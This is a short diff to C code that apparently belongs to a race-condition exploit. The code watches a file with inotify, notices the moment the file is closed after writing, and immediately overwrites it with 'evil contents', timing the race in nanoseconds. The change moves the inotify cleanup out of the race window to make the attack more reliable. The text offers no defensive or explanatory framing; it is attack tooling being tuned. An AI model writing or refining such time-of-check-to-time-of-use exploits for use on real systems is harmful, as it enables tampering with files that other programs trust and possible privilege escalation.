@@ -46,10 +46,6 @@ int check_for_close(char *path, struct timespec *t)
 	clock_gettime(CLOCK_MONOTONIC, t);
 	D("file was just closed after writing! The race begins!");
 
-	inotify_rm_watch(inofd, wd);
-	close(inofd);
-	inofd = -1;
-
 	return 1;
 }
 
@@ -74,6 +70,11 @@ void replacer_loop(char *path)
 	while(check_for_close(path, &start)) {
 		replace_evil_content(path);
 		clock_gettime(CLOCK_MONOTONIC, &end);
+
+		/* deferred cleanup of inotify, else it steals time from race window */
+		close(inofd);
+		inofd = -1;
+
 		fprintf(stdout, "noticing close() after write "
 			"and replacing with evil contents took %zdns\n",
 			(end.tv_sec - start.tv_sec) * 1000000000 +
